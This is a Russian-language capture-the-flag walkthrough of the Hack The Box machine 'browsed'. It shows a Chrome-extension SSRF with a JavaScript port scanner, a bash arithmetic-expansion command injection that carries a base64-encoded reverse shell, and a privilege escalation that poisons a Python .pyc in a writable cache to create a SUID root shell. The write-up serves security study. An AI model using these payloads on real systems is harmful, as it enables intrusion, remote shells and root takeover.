Начало стандартное это сканирование портов на то какие вообще порты октрыты
```
Starting Nmap 7.95 
Nmap scan report for 10.129.11.231
Host is up (0.095s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.75 seconds
```
Имеем веб приложение на 8 порту![[Pasted image 20260130135557.png]]
имеем приложение которое загружает расширения хрома, а после выдает логи хрома который запускается на самом сервере, загружаем одно из нескольких расширений которые предложены на сайте я приведу только часть самых важных которые помогают найти важные детали
```
[1813:1813:0130/070220.805683:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/tmp/extension_697c577c72ea20.49835777/_metadata/verified_contents.json": No such file or directory (2)
[1813:1813:0130/070220.805712:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/tmp/extension_697c577c72ea20.49835777/_metadata/computed_hashes.json": No such file or directory (2)
[1813:1813:0130/070220.805731:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/tmp/extension_697c577c72ea20.49835777/_metadata/generated_indexed_rulesets": No such file or directory (2)
[1813:1813:0130/070220.805763:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/tmp/extension_697c577c72ea20.49835777/_metadata": No such file or directory (2)
```
Браузер обращается к папке в `/tmp/extension_*` скорее всего это наше распакованное расширение которое браузер пытается обработать, то есть приложение распаковывает архив а дальше работает с ним через запускаемый хром внутри, следующий момент на который стоит обратить внимание: 
```
[1843:1866:0130/070220.964111:VERBOSE1:network_delegate.cc(37)] NetworkDelegate::NotifyBeforeURLRequest: http://browsedinternals.htb/
[1843:1866:0130/070220.964534:VERBOSE1:network_delegate.cc(37)] NetworkDelegate::NotifyBeforeURLRequest: http://localhost/
```
обращения браузера к внутренним адресам, намекает на возможность SSRF.
Для дальнейшего продвижения нужно понимать структуру расширений хром, по факту хватит двух файлов: `manifest.json` и `background.js` 
Далее пробуем SSRF на `localhost`, пример файла:
```
{
  "name": "Exploit abobas",
  "version": "1.0",
  "manifest_version": 3,
  "background": {
    "service_worker": "background.js"
  },
  "host_permissions": [
    "http://127.0.0.1/*",
    "http://localhost/*"
  ]
}
```
примреный код для брутфорса портов, при первом сканировании не нашел ничего внятного 1-4100 успел выполнить, после браузер завершает работу и соответственно писать логи тоже
```js
const TARGET = 'http://127.0.0.1';
const START_PORT = 1;
const END_PORT = 10000;
const CONCURRENCY = 50;

async function scanPort(port) {
    const controller = new AbortController();

    const timeout = setTimeout(() => controller.abort(), 1000);

    try {
        const response = await fetch(`${TARGET}:${port}`, {
            mode: 'no-cors', 
            signal: controller.signal
        });
        

        console.log(`============================[+] PORT OPEN: ${port}=====================================================`);
        
        const text = await response.text();
        console.log(`==================[!] DATA from ${port}: ${text.substring(0, 100)}...=============================`);
    } catch (err) {
    
    } finally {
        clearTimeout(timeout);
    }
}

async function bruteForce() {
    console.log(`[*] Starting scan from ${START_PORT} to ${END_PORT}...`);
    
    for (let i = START_PORT; i <= END_PORT; i += CONCURRENCY) {
        const promises = [];
        for (let j = 0; j < CONCURRENCY && (i + j) <= END_PORT; j++) {
            promises.push(scanPort(i + j));
        }
        await Promise.all(promises);
        
        if (i % 500 === 0) {
            console.log(`[*] Progress: ${i}/${END_PORT} ports scanned...`);
        }
    }
    console.log("[*] Scan completed.");
}
bruteForce();
```
после дальнейшего брутфорса нашел вот такой лог:
```
[2383:2383:0130/075316.400506:INFO:CONSOLE(18)] "============================[+] PORT OPEN: 5000=====================================================", source: chrome-extension://fcidkkknljebmdechecfieihmicahfdn/background.js (18)
[2383:2383:0130/075316.416338:INFO:CONSOLE(21)] "==================[!] DATA from 5000: 
    <h1>Markdown Previewer</h1>
    <form action="/submit" method="POST">
        <textarea name="c...=============================", source: chrome-extension://fcidkkknljebmdechecfieihmicahfdn/background.js (21)
```
далее проубем забрать содержимое страницы `/sumbit`
```
[2563:2580:0130/080458.222276:VERBOSE1:network_delegate.cc(37)] NetworkDelegate::NotifyBeforeURLRequest: http://127.0.0.1:5000/
[2534:2534:0130/080458.242340:INFO:CONSOLE(9)] "--- SOURCE START ---", source: chrome-extension://oplklkdnegjaiebcpackglfbjbbbhpkn/background.js (9)
[2534:2534:0130/080458.242376:INFO:CONSOLE(10)] "
    <h1>Markdown Previewer</h1>
    <form action="/submit" method="POST">
        <textarea name="content" rows="10" cols="80"></textarea><br>
        <input type="submit" value="Render & Save">
    </form>
    <p><a href="/files">View saved HTML files</a></p>
    ", source: chrome-extension://oplklkdnegjaiebcpackglfbjbbbhpkn/background.js (10)
[2534:2534:0130/080458.242403:INFO:CONSOLE(12)] "--- SOURCE END ---", source: chrome-extension://oplklkdnegjaiebcpackglfbjbbbhpkn/background.js (12)
```
далее я забрал код страницы `/files` но ничего внятного я не нашел, если я правильно понял то он сохраняет просто расширения в html для чего не понятно но я могу ошибаться но зато можно брутфорсить директории сайта
```
[4016:4016:0130/101544.488242:INFO:CONSOLE(9)] "[!] Статус: 200", source: chrome-extension://efjafilgphkdceclahlioplhfaaempfn/background.js (9)
[4016:4016:0130/101544.488396:INFO:CONSOLE(10)] "--- НАЧАЛО КОНТЕНТА ---", source: chrome-extension://efjafilgphkdceclahlioplhfaaempfn/background.js (10)
[4016:4016:0130/101544.488470:INFO:CONSOLE(13)] "Routine executed !", source: chrome-extension://efjafilgphkdceclahlioplhfaaempfn/background.js (13)
[4016:4016:0130/101544.488514:INFO:CONSOLE(14)] "--- КОНЕЦ КОНТЕНТА ---", source: chrome-extension://efjafilgphkdceclahlioplhfaaempfn/background.js (14)
[4016:4016:0130/101544.488564:INFO:CONSOLE(17)] "[i] Заголовки ответа:", source: chrome-extension://efjafilgphkdceclahlioplhfaaempfn/background.js (17)
[4016:4016:0130/101544.488606:INFO:CONSOLE(19)] "    connection: close", source: chrome-extension://efjafilgphkdceclahlioplhfaaempfn/background.js (19)
[4016:4016:0130/101544.488697:INFO:CONSOLE(19)] "    content-length: 18", source: chrome-extension://efjafilgphkdceclahlioplhfaaempfn/background.js (19)
[4016:4016:0130/101544.488742:INFO:CONSOLE(19)] "    content-type: text/html; charset=utf-8", source: chrome-extension://efjafilgphkdceclahlioplhfaaempfn/background.js (19)
[4016:4016:0130/101544.488793:INFO:CONSOLE(19)] "    date: Fri, 30 Jan 2026 10:15:44 GMT", source: chrome-extension://efjafilgphkdceclahlioplhfaaempfn/background.js (19)
[4016:4016:0130/101544.488887:INFO:CONSOLE(19)] "    server: Werkzeug/3.1.3 Python/3.12.3", source: chrome-extension://efjafilgphkdceclahlioplhfaaempfn/background.js (19)
```
сервер по разному ответил на POST(405 - метод запрещен) и GET(200) + отдает сообщение `Routine executed`, то есть он что то выполнил ну и теперь знаем то язык сервера это Python.
Далее я пробовал различные инъекции связанные с питоном и bash, в результате получил что рабочая будет инъекция с использованием арифметического выражения, то есть 
```
a[$(echo YmFzaCAtaSA+JsdfgsdfgdfgsdgxNC4yNDkvNDQ0NCAwPiYx | base64 -d | bash)]
```
используем технику арифметической инъекции где мы хотим взять элемент массива который прописан как reverse shell к нам, предварительно закодированный в base64, и завернутый в URL кодирование потому что запрос отдается напрямую в URL, и в результате получим reverseshell ![[Pasted image 20260130175417.png]]
далее спокойно забираем юзер флаг из `user.txt`
```
larry@browsed:~$ cat user.txt                                                                            
cat user.txt                                                                                             
d3d1318a4f189e7799fa302776a4f353   
```
После нужно подняться до рута, запускаем linpeas и он скажет что `sudo -l` можно посмотреть без пароля
```
larry@browsed:~$ id
uid=1000(larry) gid=1000(larry) groups=1000(larry)
larry@browsed:~$ sudo -l
Matching Defaults entries for larry on browsed:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User larry may run the following commands on browsed:
    (root) NOPASSWD: /opt/extensiontool/extension_tool.py

```
находим какой то скрипт в нем содержится следующее: 
```
larry@browsed:/opt/extensiontool$ ls -la
total 24
drwxr-xr-x 4 root root 4096 Dec 11 07:54 .
drwxr-xr-x 4 root root 4096 Aug 17 12:55 ..
drwxrwxr-x 5 root root 4096 Mar 23  2025 extensions
-rwxrwxr-x 1 root root 2739 Mar 27  2025 extension_tool.py
-rw-rw-r-- 1 root root 1245 Mar 23  2025 extension_utils.py
drwxrwxrwx 2 root root 4096 Dec 11 07:57 __pycache__
larry@browsed:/opt/extensiontool$ cat extension_tool.py 
#!/usr/bin/python3.12
import json
import os
from argparse import ArgumentParser
from extension_utils import validate_manifest, clean_temp_files
import zipfile

EXTENSION_DIR = '/opt/extensiontool/extensions/'

def bump_version(data, path, level='patch'):
    version = data["version"]
    major, minor, patch = map(int, version.split('.'))
    if level == 'major':
        major += 1
        minor = patch = 0
    elif level == 'minor':
        minor += 1
        patch = 0
    else:
        patch += 1

    new_version = f"{major}.{minor}.{patch}"
    data["version"] = new_version

    with open(path, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=2)
    
    print(f"[+] Version bumped to {new_version}")
    return new_version

def package_extension(source_dir, output_file):
    temp_dir = '/opt/extensiontool/temp'
    if not os.path.exists(temp_dir):
        os.mkdir(temp_dir)
    output_file = os.path.basename(output_file)
    with zipfile.ZipFile(os.path.join(temp_dir,output_file), 'w', zipfile.ZIP_DEFLATED) as zipf:
        for foldername, subfolders, filenames in os.walk(source_dir):
            for filename in filenames:
                filepath = os.path.join(foldername, filename)
                arcname = os.path.relpath(filepath, source_dir)
                zipf.write(filepath, arcname)
    print(f"[+] Extension packaged as {temp_dir}/{output_file}")

def main():
    parser = ArgumentParser(description="Validate, bump version, and package a browser extension.")
    parser.add_argument('--ext', type=str, default='.', help='Which extension to load')
    parser.add_argument('--bump', choices=['major', 'minor', 'patch'], help='Version bump type')
    parser.add_argument('--zip', type=str, nargs='?', const='extension.zip', help='Output zip file name')
    parser.add_argument('--clean', action='store_true', help="Clean up temporary files after packaging")
    
    args = parser.parse_args()

    if args.clean:
        clean_temp_files(args.clean)

    args.ext = os.path.basename(args.ext)
    if not (args.ext in os.listdir(EXTENSION_DIR)):
        print(f"[X] Use one of the following extensions : {os.listdir(EXTENSION_DIR)}")
        exit(1)
    
    extension_path = os.path.join(EXTENSION_DIR, args.ext)
    manifest_path = os.path.join(extension_path, 'manifest.json')

    manifest_data = validate_manifest(manifest_path)
    
    # Possibly bump version
    if (args.bump):
        bump_version(manifest_data, manifest_path, args.bump)
    else:
        print('[-] Skipping version bumping')

    # Package the extension
    if (args.zip):
        package_extension(extension_path, args.zip)
    else:
        print('[-] Skipping packaging')


if __name__ == '__main__':
    main()

```
из интересного сразу заметим что папка для кеша дает нам возможность писать туда, значит нужно понять что делает наш скрипт 
Он работает с расширениями из `extinsions`, загружает их с помощью `--ext` и берет `manifest.json` с помощью `extension_utils.py`. В процессе я пробовал подмену пути, что не сработало, запуск из других директорий но не сработало ничего, позже ИИ объяснил как работает запуск программ на питон, если есть скомпилированный файл то используется он, но если его нет то компилируется и исполняется именно код из нужного файла, по факту нужно сделать скомпилированный файл который съест приложение и не будет ругаться, у меня это получилось когда я скачал файл на машину, уровнял его по количеству символов с моим зараженным фалом который копировал `bash` с S битом, далее нашел что метаданные питон файла занимают 16 байт, то есть если я их просто заменю для моего файла то это будет работать, используя этот маленький скрипт для двух скомпилированных на  уязвимой машине файлов 
```

with open('extension_utils.cpython-312.pyc', 'rb') as f:
    header = f.read(16)


with open('./scompl/extension_utils.cpython-312.pyc', 'rb') as f:
    f.seek(16)
    body = f.read()


with open('pwned.pyc', 'wb') as f:
    f.write(header)
    f.write(body)

```
после замены забираем нужный нам файл и запускаем
```
-rwsr-sr-x 1 root     root     1446024 Jan 30 11:19 rootbash
```
в результате мы получили наш рутбаш запускаем и забираем флаг 
```
larry@browsed:/tmp$ ./rootbash -p
rootbash-5.2# id
uid=1000(larry) gid=1000(larry) euid=0(root) egid=0(root) groups=0(root),1000(larry)
rootbash-5.2# cat /root/root.txt
243858b06de7af6e245e55806f48efaf
```